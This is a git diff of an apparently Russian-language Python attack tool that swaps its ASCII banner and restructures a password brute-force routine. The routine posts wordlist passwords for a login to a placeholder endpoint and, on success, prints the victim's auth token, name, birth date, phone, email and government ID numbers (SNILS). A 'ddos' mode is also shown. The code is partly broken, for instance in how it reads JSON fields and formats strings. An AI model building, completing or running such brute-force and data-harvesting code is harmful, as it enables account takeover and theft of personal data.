@@ -5,16 +5,12 @@ import random
 #from colorama import init, Fore, Back, Style
 #init()
 banner = """
-:::'###::::'##::: ##:'########:'####::'######:::'######::'##::::'##:
-::'## ##::: ###:: ##:... ##..::. ##::'##... ##:'##... ##: ##:::: ##:
-:'##:. ##:: ####: ##:::: ##::::: ##:: ##:::..:: ##:::..:: ##:::: ##:
-'##:::. ##: ## ## ##:::: ##::::: ##::. ######:: ##::::::: #########:
- #########: ##. ####:::: ##::::: ##:::..... ##: ##::::::: ##.... ##:
- ##.... ##: ##:. ###:::: ##::::: ##::'##::: ##: ##::: ##: ##:::: ##:
- ##:::: ##: ##::. ##:::: ##::::'####:. ######::. ######:: ##:::: ##:
-..:::::..::..::::..:::::..:::::....:::......::::......:::..:::::..::
 
-    created by @debian_lab && @mitchel_ed
+─█▀▀█ ░█▄─░█ ▀▀█▀▀ ▀█▀ ░█▀▀▀█ ░█▀▀█ ░█─░█ 
+░█▄▄█ ░█░█░█ ─░█── ░█─ ─▀▀▀▄▄ ░█─── ░█▀▀█ 
+░█─░█ ░█──▀█ ─░█── ▄█▄ ░█▄▄▄█ ░█▄▄█ ░█─░█
+
+    created by @debian_la   b && @mitchel_ed
 """
 
 
@@ -28,38 +24,41 @@ def bruteforce(mode, login):
         clear()
         print(f"[+] Атака на {login} началась")
         passwords = open("./slovar.txt", "r", encoding="utf-8").readlines()
-        for password in passwords:
-            res = requests.post("https://jsonplaceholder.typicode.com/posts", json={
-                "login": login,
-                "password_plain": password
-            })
-            
-            
-            if res.status_code != 200:
-                print("[-] Пароль " + password + " не подходит!\n")
+        if passwords != "":
+            for password in passwords:
+                res = requests.post("https://jsonplaceholder.typicode.com/posts", json={
+                    "login": login,
+                    "password_plain": password
+                })
                 
-            elif res.status_code == 200:
-                print("[+] Пароль {password} подошел!")
-                token = res.json().authentication_token
-                date = res.json().date_of_birth
-                first_name = res.json().first_name
-                guid = res.json().guid
-                email = res.json().email
-                id = res.json().id
-                last_name = res.json().last_name
-                phone = res.json().phone_number
-                sex = res.json().sex
-                snils = res.json().snils 
-                print("[+] Полученные данные:")
-                print("Токен Авторизации: " + token)
-                print("Имя: " + first_name + "  " + last_name)
-                print("Пол: " + sex)
-                print("Дата Рождения: " + date)
-                print("Государственный ID: " + guid)
-                print("Номер телефона: " + phone)
-                print("Электронная почта: " + email)
-                print("СНИЛС " + snils)
-                break
+                
+                if res.status_code != 200:
+                    print("[-] Пароль " + password + " не подходит!\n")
+                    
+                elif res.status_code == 200:
+                    print("[+] Пароль {password} подошел!")
+                    token = res.json().authentication_token
+                    date = res.json().date_of_birth
+                    first_name = res.json().first_name
+                    guid = res.json().guid
+                    email = res.json().email
+                    id = res.json().id
+                    last_name = res.json().last_name
+                    phone = res.json().phone_number
+                    sex = res.json().sex
+                    snils = res.json().snils 
+                    print("[+] Полученные данные:")
+                    print("Токен Авторизации: " + token)
+                    print("Имя: " + first_name + "  " + last_name)
+                    print("Пол: " + sex)
+                    print("Дата Рождения: " + date)
+                    print("Государственный ID: " + guid)
+                    print("Номер телефона: " + phone)
+                    print("Электронная почта: " + email)
+                    print("СНИЛС " + snils)
+                    break
+        else:
+            print("[-] Вы не заполнили slovar.txt")
     elif mode == "ddos":
         while True:
             instance = "abcdefghijklmnopqrstuvwxyz"
@@ -104,10 +103,10 @@ def option_check():
     if option == 3:
         clear()
         if version == 1:
-            print("\n\nВсе пароли требуется добавить в файл slovar.txt\nЕсли вы не знаете логин - то все логины на которые будет производится атака необходимо добавить в файл logins.txt\nЕсли вы знаете логин - этого делать не потебуется")
+            print("\n\nВсе пароли по которым будет брутфорс требуется добавить в файл slovar.txt\n")
             input("Нажмите 'Enter' чтобы продолжить.....")
         elif version == 2:
-            print("\n\nAll passwords must be added to the slovar.txt file\nIf you do not know the login, then all the logins that will be attacked must be added to the logins.txt file\nIf you know the login, there is no need to do this")
+            print("\n\nAll passwords must be added to the slovar.txt file\n")
             input("Press 'Enter' to continue.....")
 
         clear()
